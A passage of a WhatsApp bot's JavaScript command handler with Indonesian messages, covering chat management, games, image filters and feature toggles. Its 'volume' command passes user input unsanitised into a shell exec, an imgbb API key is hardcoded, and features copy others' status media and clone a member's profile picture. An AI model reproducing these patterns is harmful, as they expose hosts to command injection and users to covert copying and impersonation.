					fakegroup( `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
					break
           
			case 'listvn':
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama audio_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break
			case 'addrespon':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if(!q) return reply(`ketik perintah ${prefix + command} filter|jawab!`)
					fltr = q.split('|')[0]
					jwb = q.split('|')[1]
					if(!jwb) return reply('Format salah!')
					for(let i of filter){
					  if(fltr.includes(i.Filter)) return reply(`Filter ${fltr} sudah ada didatabase`)
					}
					const chat = {
					Filter : fltr,
					Jawaban : jwb
					}
					filter.push(chat)
					fs.writeFileSync('./src/filter.json', JSON.stringify(filter))
					reply(`Sukses menambahkan filter ${fltr}\nCek dengan cara ${prefix}listchatrespon`)
					break
					
			case 'delrespon':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					for(let i=0; i<filter.length; i++){
					if(q.includes(filter[i].Filter)){
					   obj = {
					      txt: filter[i].text,
					      balesan: filter[i].balesan
					   }
					   let del = filter.indexOf(filter[i])
					   filter.splice(del, 1)
					   fs.writeFileSync('./src/filter.json', JSON.stringify(filter))
					   reply(`Sukses Menghapus Respon ${q}`)
					}
					}
					break
case 'listrespon':
   teks = 'List Respon:\n'
   for (let i of filter) {
   teks += `• Filter : ${i.Filter}\n• Jawab : ${i.Jawaban}\n---------------------------\n`
   }
   teks += `Total : ${filter.length}`
   alpha.sendMessage(from, teks.trim(), extendedText, {quoted: mek})
   break
		case 'caripesan2':
            if(!q)return reply('Masukkan pesan yg mau di cari')
            let v = await alpha.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await alpha.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
     case 'searchmsg':  
             if (args.length < 1) return reply(`Pesan Yang Mau Dicari Apaan?\nContoh : ${command} halo|10`)
             teks = arg
             if (teks.includes("|")) { 
             try {
             var ve = teks.split("|")[0]
             var za = teks.split("|")[1]
             sampai = `${za}`
             if (isNaN(sampai)) return reply('Harus berupa Angka!')
             batas = parseInt(sampai) + 1
             if (batas > 20) return reply('Maks 20!')
             reply(lang.wait())
             cok = await nino.searchMessages(`${ve}`, from, batas,1) 
             if (cok.messages.length < 2) return reply('Tidak Ditemukan Pesan') 
             if (cok.messages.length < parseInt(batas)) reply(`Hanya Ditemukan ${cok.messages.length - 1} Pesan`)
             for (i=1;i < cok.messages.length;i++) {
             if (cok.messages[i].message) {
             alpha.sendMessage(from, `Ditemukan!`, text, {sendEphemeral: true, quoted: cok.messages[i]}) 
			}
			}
             } catch (e) {
             return reply(String(e))}
             } else {
             reply(`Format salah, format yang benar : ${command} halo|10`)}
             break
    case 'hash':
                try {
                if (!isQuotedSticker) return reply('Reply Sticker!')
                const encmeds = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                const mediastick = await alpha.downloadMediaMessage(encmeds)
                var crypto = require('crypto')
                hash = crypto.createHash('sha256').update(mediastick).digest('base64');
                console.log(hash)
                reply (hash)
                } catch {
                	reply(`reply stiker dengan command ${prefix}hash`)
	}
            break
    case 'delvote':
            if(!isGroupAdmins && !mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlygcAdmin())
            if(isVote) return reply(lang.noSesiVote())
            delVote(from)
            reply(lang.suksesDelVot())
            break
    case 'voting':
            if(!isGroupAdmins && !mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlygcAdmin())
            if(!isGroup) return reply(lang.onlygc())
            if (isVote) return reply(lang.adaVoting())
            if(!q) return reply(lang.caraVoting())
            if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || mek.message.extendedTextMessage.contextInfo == null) {
            let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply(lang.caraVot(prefix, command))
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
		case 'jadibot':
			//    if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.callOwner())
			//    jadibot(reply,alpha,from)
			var jadibdj = await getBuffer('https://telegra.ph/file/18be96b6415ea8833dbe5.jpg')
							sendButLocation(from, jadibut() , `Jangan klik doang 〽️ ${enter}${enter}${botname}™© | By ${ownername}`,jadibdj,  [{"buttonId": `payment`,"buttonText": {"displayText": "PAYMENT"},"type": "RESPONSE"}], {})
							break
			    break
		case 'stopjadibot':
			    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			    stopjadibot(reply)
			    break
		case 'listbot':
			    let tekss = '「 *LIST JADIBOT* 」\n'
			    for(let i of listjadibot) {
			    tekss += `*Number* : ${i.jid.split('@')[0]}
*Name* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
			    }
			    reply(tekss)
		case 'addcmd': 
       case 'setcmd':
              if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
              if (isQuotedSticker) {
              if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              addCmd(kodenya, q)
              reply(lang.success())
              } else {
              reply('Reply stickenya')
}
              break
       case 'delcmd':
              if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
              if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
            scommand.splice(getCommandPosition(kodenya), 1)
              fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
              reply(lang.success())
              break
       case 'listcmd':
              let teksnyee = `「 *LIST STICKER CMD* 」`
              let cemde = [];
              for (let i of scommand) {
              cemde.push(i.id)
              teksnyee += `\n\n📍 *ID :* ${i.id}\n📍 *Cmd* : ${i.chats}`
}
              mentions(teksnyee, cemde, true)
              break
      case 'delttt':
case 'delttc':
               if (!isGroup) return reply(lang.onlygc())
              // if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
               delete tictactoe[senderNumber]
fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))                        
if (fs.existsSync('./temp/' + from + '.json')) {
fs.unlinkSync('./temp/' + from + '.json')
reply(lang.suksesDelTtt())
}
               break
        case 'cekhistory':
reply(` S T A T U S  T I C T A C T O E ${enter}•> Win : ${checkWin(sender)}${enter}•> Lose : ${checkLose(sender)}`)
break
case 'delsesi':
if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return reply('Hanya bisa didelete oleh admin group dan owner bot')
if (args[0] === 'ttt') {
delete tictactoe[senderNumber]
fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))                        
if (fs.existsSync('./temp/' + from + '.json')) {
fs.unlinkSync('./temp/' + from + '.json')
reply(lang.noSesiTtt())
}
} else if (args[0] === 'vote') {
if(isVote) return reply(lang.noSesiVote())
            delVote(from)
            reply(lang.sukseDelVot())
} else {
	reply(`${prefix + command}delsesi ttt atau vote`)
}
break

case 'tictactoe':
case 'ttt':
if (!isGroup)return reply('*Khusus group*')
if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
if (fs.existsSync(`./temp/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan${enter}Ketik *${prefix}delsesi ttt*, untuk menghapus sesi`)
if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
tttSkuy = setTtt(`${from}`)
tttSkuy.status = false
tttSkuy.Z = sender.replace("@s.whatsapp.net", "")
tttSkuy.Y = args[0].replace("@", "");
fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
starGame = `「 *MEMULAI GAME TICTACTOE* 」${enter}${enter}•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe ${enter}[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan${enter}${enter}`
alpha.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
break
             case 'size':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await alpha.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:mek})
alpha.relayWAMessage(costick)
break
case "colongsw": 
        if (!mek.key.fromMe) return
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await alpha.downloadAndSaveMediaMessage(ger);
          alpha.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await alpha.downloadAndSaveMediaMessage(ger);
          alpha.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong")
        }
        break
       case "listonline": 
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        try {
          let online = [
            ...Object.keys(alpha.chats.get(id).presences),
            alpha.user.jid,
          ];
          alpha.reply(
            m.chat,
            "「 L I S T   O N L I N E  」\n" +
              online.map((v) => "├ @" + v.replace(/@.+/, "")).join`\n` +
              "\n",
            m,
            {
              contextInfo: { mentionedJid: online },
            }
          );
        } catch (e) {
          m.reply("");
        }
        break;
        case 'getname':
 try {
getnem = alpha.getName(mek.quoted.sender)
reply(`${getnem}`)
} catch {
	reply ('Reply pesan @user')
	}
break
case 'linkgrup':
case 'linkgroup':
				case 'linkgc':
				    if (!isGroup) return reply(lang.onlygc())
				    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				    linkgc = await alpha.groupInviteCode (from)
				    yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
				    alpha.sendMessage(from, yeh, text, {quoted: mek})
			        break
		case 'unpin':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                alpha.modifyChat(from, ChatModification.unpin)
                reply('*succes unpin this chat*')
                console.log('unpin chat = ' + from)
                break
        case 'pin':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                alpha.modifyChat(from, ChatModification.pin)
                reply('*succes pin this chat*')
                console.log('pinned chat = ' + from)
                break
         case 'unreadall':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                var chats = await alpha.chats.all()
                chats.map( async ({ jid }) => {
                await alpha.chatRead(jid, 'unread')
                    })
		    reply(`\`\`\`Successfully unread ${chats.length} chats !\`\`\``)
		    console.log(chats.length)
	        break
	        
            case 'readall':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                var chats = await alpha.chats.all()
                chats.map( async ({ jid }) => {
                await alpha.chatRead(jid)
                })
		reply(`\`\`\`Successfully read ${chats.length} chats !\`\`\``)
	      console.log(chats.length)
		break
		case 'unarchiveall':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                reply('*succes unarchive all chat*')
                console.log('succes unarchive chat = ' + from)
                anu = await alpha.chats.all()
                for (let _ of anu) {
                alpha.modifyChat(_.jid, ChatModification.unarchive)
                }
                break
                
            case 'archive':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                reply(lang.wait())
                console.log('succes archive chat = ' + from)
                await sleep(3000)
                alpha.modifyChat(from, ChatModification.archive)
                break
           case 'delthischat':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                console.log('succes delete chat = ' + from)
                await sleep(4000)
                await alpha.modifyChat(from, ChatModification.delete)
                reply('*succes delete this chat*')
                break
            case 'ssweb':
            case 'ss':
                if (args.length < 1) return reply('Urlnya mana om')
					teks = q
					anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
					buff = await getBuffer(anu.screenshot)
					alpha.sendMessage(from, buff, image, {quoted: mek, caption : teks})
					break
			case 'artinama':
                if (args.length < 1) return reply('Apa yang mau dicari um?')
                teks = q
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/arti?nama=${teks}`, {method: 'get'})
					reply(`Arti Nama ${teks}\n\n`+anu.result)
				break
			case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
ter = command[1].toLowerCase()
  tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
 reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
 break
 case 'getexif':
try {
    if (!m.quoted) return reply('Tag stikernya!')
    cok = { message: { [m.quoted.mtype]: m.quoted } }
    if (/sticker/.test(m.quoted.mtype)) {
        let img = new webp.Image()
        await img.loadBuffer(await m.quoted.download())
        reply(util.format(JSON.parse(img.exif.slice(22).toString())))
    }
    } catch (e) {
    	throw e
    reply(String(e))
    }
    break
		case 'afk':
			if (!isGroup) return reply(lang.onlygc())
            if (isAfkOn) return 
                reason = q ? q : 'Nothing'
                off.addAfkUser(sender, Date.now(), reason, _off)
               papa =  `\n*@${sender.split('@')[0]}* is now AFK\n*Reason :* ${reason}\n`
                alpha.sendMessage(from,papa, text,{quoted : ftroli,contextInfo: {mentionedJid: [sender]}})
            break
        case 'autoread':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return reply(lang.anjawaUdhOn(command))
readGc = true
reply(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readGc === false) return
readGc = false
reply(`Succes mematikan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return reply(lang.anjawaUdhOn(command))
readPc = true
reply(`Succes mengaktifkan autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
reply(`Succes mematikan autoread pc`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break
case 'nsfw':
					    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
						if (!isGroup) return reply(lang.onlygc()) 
						if (args.length < 1) return reply(lang.anjawaUdhOon(command))
						if (args[0] === 'on') {
						if (isNsfw) return reply(lang.anjawaUdhOn(command))
						_nsfw.push(from)
						fs.writeFileSync('./src/nsfw.json', JSON.stringify(_nsfw))
						reply(lang.anjawaOn(command))
						} else if (args[0] === 'off') {
						_nsfw.splice(from, 1)
						fs.writeFileSync('./src/nsfw.json', JSON.stringify(_nsfw))
						reply(lang.anjawaOff(command))
						} else if (!q) {
          sendButMessage(from, `MODE NSFW`, `Choose one`, [
            {
              buttonId: 'nsfw on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'nsfw off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'antibug':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          if (args[0] === 'on') {
          if (bugc === true) return reply(lang.anjawaUdhOn(command))
          bugc = true
          antitrol = true
          reply(lang.anjawaOn(command))
          } else if (args[0] === 'off') {
          if (bugc === false) return
          bugc = false
          antitrol = false
          reply(lang.anjawaOff(command))
          } else if (!q) {
          sendButMessage(from, `MODE ANTIBUG`, `Choose one`, [
            {
              buttonId: 'antibug on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antibug off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
          case 'antidelete':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (antidel === true) return reply(lang.anjawaUdhOn(command))
antidel = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (antidel === false) return
antidel = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE ANTI DELETE`, `Choose one`, [
            {
              buttonId: 'antidelete on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antidelete off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'welcome':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (welcome === true) return reply(lang.anjawaUdhOn(command))
welcome = true
leave = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (welcome === false) return
welcome = false
leave = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO WELCOME`, `Choose one`, [
            {
              buttonId: 'welcome on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'welcome off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'anticall':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (antical === true) return reply(lang.anjawaUdhOn(command))
antical = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (antical === false) return
antical = false
reply(lang.anjawaOff(command))
} else {
reply(lang.onORoff(command))
}
break
case 'autoketik':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autoketik === true) return reply(lang.anjawaUdhOn(command))
autoketik = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autoketik === false) return
autoketik = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO KETIK`, `Choose one`, [
            {
              buttonId: 'autoketik on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autoketik off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'autorespon': case 'autorespond':
      if (!isOwner && !isCreator && !mek.key.fromMe) return reply(lang.onlyOwner())
       if (q === 'on'){
           	if (autorespon === false) return reply(lang.anjawaUdhOn(command))
              autorespon = false
                    reply(lang.anjawaOn(command))
                } else if (q === 'off'){
                	if (autorespon === true) return
                    autorespon = true
                    reply(lang.anjawaOff(command))
                } else if (!q) {
          sendButMessage(from, `MODE AUTO RESPON`, `Choose one`, [
            {
              buttonId: 'autorespon on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autorespon off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'autobio':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autobio === true) return reply(lang.anjawaUdhOn(command))
autobio = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autobio === false) return
autobio = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO BIO`, `Choose one`, [
            {
              buttonId: 'autobio on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autobio off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'antihidetag':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (antihidetag === true) return reply(lang.anjawaUdhOn(command))
antihidetag = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (antihidetag === false) return
antihidetag = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE ANTI HIDETAG`, `Choose one`, [
            {
              buttonId: 'antihidetag on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antihidetag off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'autovn':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autovn === true) return reply(lang.anjawaUdhOn(command))
autovn = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autovn === false) return
autovn = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO VN`, `Choose one`, [
            {
              buttonId: 'autovn on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autovn off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'autoregis': case 'register':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autoregister === true) return reply(lang.anjawaUdhOn(command))
autoregister = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autoregister === false) return
autoregister = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO REGISTER`, `Choose one`, [
            {
              buttonId: 'register on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'register off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'wanted':
case 'utatoo':
case 'unsharpen':
case 'thanos':
case 'sniper':
case 'sharpen':
case 'sepia':
case 'scary':
case 'rip':
case 'redple':
case 'rejected':
case 'posterize':
case 'ps4':
case 'pixelize':
case 'missionpassed':
case 'moustache':
case 'lookwhatkarenhave':
case 'jail':
case 'invert':
case 'instagram':
case 'greyscale':
case 'glitch':
case 'gay':
case 'frame':
case 'fire':
case 'distort':
case 'dictator':
case 'deepfry':
case 'ddungeon':
case 'circle':
case 'challenger':
case 'burn':
case 'brazzers':
case 'beautiful':
console.log(command + '  -> Mungkin fitur ini masih suka eror ngab jadi fix sendiri ya')
     var imgbb = require('imgbb-uploader')
     if (isQuotedImage) {
     reply(lang.wait())
     let ppk = await alpha.getProfilePicture(sender).catch(_ => 'https://telegra.ph/file/6ea2baa958c1d4c68fb73.png')
	 thumbnya = await getBuffer(ppk)
   var bioij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
    var delib = await alpha.downloadAndSaveMediaMessage(bioij, `./media/${sender}.png`)
    let  datau = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", delib)
     anuk = `${datau.display_url}`
     ini_gen = `${command}`
     console.log(color(ini_gen))
     imoj = await ameApi.generate(ini_gen, { url: anuk})
     alpha.sendFile(from, imoj, `${sender}.png`, null, mek, {thumbnail: thumbnya})
     } else {
     	reply(lang.wait())
		ghost = mek.message.extendedTextMessage.contextInfo.participant || mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
		let oppp = await alpha.getProfilePicture(ghost).catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
		let medianya = await getBuffer(oppp)
		let datae = await imageToBase64(JSON.stringify(oppp).replace(/\"/gi, ''))
		fs.writeFileSync('janckuk.jpeg', datae, 'base64')
		let odata = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", 'janckuk.jpeg')
		anuk = `${odata.display_url}`
     ini_gen = `${command}`
     console.log(color(ini_gen))
     imoj = await ameApi.generate(ini_gen, { url: anuk})
     alpha.sendFile(from, imoj, `${sender}.png`, null, mek, {thumbnail: medianya})
     } 
     break
 case 'volume':
if (!isQuotedAudio) return reply('Reply audio!')
let encmedia3 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media3 = await alpha.downloadAndSaveMediaMessage(encmedia3)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media3)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
alpha.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: ftroli})
fs.unlinkSync(rname)
}
)
case 'balik':
if (!isQuotedAudio) return reply('Reply audio!')
	let encmedia4 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	let media4 = await alpha.downloadAndSaveMediaMessage(encmedia4)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media4} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media4)
if (err) return reply('emror')
hihi = fs.readFileSync(ran)
alpha.sendMessage(from, hihi, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
fs.unlinkSync(ran)
	})
break
break
			case 'banlist': case 'blocklist': case 'listban': case 'listblock': 
          teks = '╭────「 *BANNED  LIST* 」\n'
          for (let hui of banned) {
            teks += `│+  @${hui.split('@')[0]}\n`
          }
          teks += `│+ Total : ${banned.length}\n╰──────「 *ALPHA BOT* 」────`
          alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": [hui] } })
          break
 		case 'ban': case 'banned': case 'block':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
					banned.push(bnnd)
					fs.writeFileSync('./src/banned.json', JSON.stringify(banned))
					fakestatus(`Nomor ${bnnd} telah dibanned!`)
          break

        case 'unban': case 'unbannned': case 'unblock':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          ya = `${args[0].replace('@', '')}@s.whatsapp.net`
					unb = banned.indexOf(ya)
					banned.splice(unb, 1)
					fs.writeFileSync('./src/banned.json', JSON.stringify(banned))
					fakestatus(`Nomor ${ya} telah di unban!`)
          break
          case 'darkjokes':
					let data = fs.readFileSync('./src/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					alpha.sendMessage(from, hasil, image, {thumbnail: Buffer.alloc(0), quoted: fgclink})
					break
					/*case 'save':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if(!q) return reply(`${prefix}save nama|nomor , Nomor Harus Berupa Kode Negara 62xxx`)
nma = q.split('|')[0]
nmor = q.split('|')[1]
if(!nma) return reply('Format salah!')
if(!nmor) return reply('Format salah!')
H1 = {
nama : nma,
nomor : nmor
}
save.push(H1)
fs.writeFileSync('./lib/sv.js', JSON.stringify(save))
alpha.sendMessage(from, `Oke Sudag Tersimpan`, MessageType.text, { quoted: mek})		     	 
break
case 'mutual':
data = fs.readFileSync('./lib/sv.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
randIndex2 = Math.floor(Math.random() * jsonData.length);
randKey2 = jsonData[randIndex2];
randIndex3 = Math.floor(Math.random() * jsonData.length);
randKey3 = jsonData[randIndex3];
let mutual = `*Nama*: ${randKey.nama}\n*Nomor*: wa.me/${randKey.nomor}\n\n*Nama*: ${randKey2.nama}\n*Nomor*: wa.me/${randKey2.nomor}\n\n*Nama*: ${randKey3.nama}\n*Nomor*: wa.me/${randKey3.nomor}`
reply(mutual)
break*/
		
			case 'clone':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (!isGroup) return reply(lang.onlygc())
if (args.length < 1) return reply('Tag target yang ingin di clone')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, idk, notify } = groupMembers.find(x => x.jid === mentioned)
try {
var pp = await alpha.getProfilePicture(idk)
buffer = await getBuffer(pp)
alpha.updateProfilePicture(botNumber, buffer)
mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
} catch (e) {
reply('Emror')
}
break
case 'tes': case 'bot':
var ini_gopayyp = `${ucapannya2}\nBot sudah on kak silahkan di pakai`
var buttonsos = [
{buttonId: 'Menu', buttonText: {displayText: 'Menu'}, type: 1},
{buttonId: 'runtime', buttonText: {displayText: 'Runtime'}, type: 1}]

butptonMessagee = {
contentText: ini_gopayyp,
